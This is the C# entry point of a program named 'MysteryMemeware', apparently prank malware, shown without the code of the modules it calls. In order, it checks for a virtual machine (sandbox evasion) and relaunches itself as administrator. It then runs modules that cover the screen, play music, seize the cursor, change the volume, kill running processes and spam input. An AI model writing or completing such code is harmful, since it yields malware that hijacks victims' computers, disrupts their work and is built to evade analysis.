namespace MysteryMemeware
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            VMCheckModule.VMCheck();

            AdminRelaunchModule.Run();

            ScreenCoverModule.Run();
            MusicModule.Run();
            CursorControlModule.Run();
            VolumeModule.Run();
            ProcessExterminatorModule.Run();
            InputSpamModule.Run();
        }
    }
}